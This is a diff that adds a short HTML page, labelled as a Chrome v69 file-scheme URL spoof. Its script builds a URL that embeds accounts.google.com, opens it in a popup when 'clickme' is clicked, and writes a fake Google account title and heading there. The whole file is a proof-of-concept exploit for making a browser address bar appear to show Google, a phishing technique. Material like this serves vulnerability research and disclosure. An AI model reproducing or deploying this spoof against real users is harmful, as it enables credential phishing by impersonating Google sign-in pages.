@@ -1,0 +1,19 @@
+ <html>
+    <body>
+        <div id="content">
+        </div>
+        <script>
+            /* Chrome v69 FileScheme URL Spoof */
+            let url = window.location.href.split('///');
+            let target = url[0]+'//accounts.google.com/'+url[1];
+            pwn = () => {
+                window.open(target, 'test', 'width=250 height=300');
+            }
+            if(window.name=='test'){
+                document.write('<title>Google 帐号</title><h1>Fake Google.com</h1>');
+            } else {
+                document.getElementById("content").innerHTML = "<h1 onclick='pwn()'>clickme</h1>";
+            }
+        </script>
+    </body>
+    </html>
